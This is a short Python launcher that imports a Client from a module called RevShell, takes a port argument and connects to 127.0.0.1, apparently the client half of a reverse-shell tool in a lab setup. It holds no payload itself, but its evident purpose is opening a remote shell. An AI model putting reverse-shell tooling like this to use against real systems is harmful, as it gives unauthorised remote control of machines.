from RevShell import Client

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    # p.add_argument('--host', '-s', type=str, default='10.11.17.150')
    p.add_argument('--port', '-p', type=int, default=58777)
    args = p.parse_args()
    client = Client('127.0.0.1', args.port)
    client.connect()
    client.receive()
    client.stop()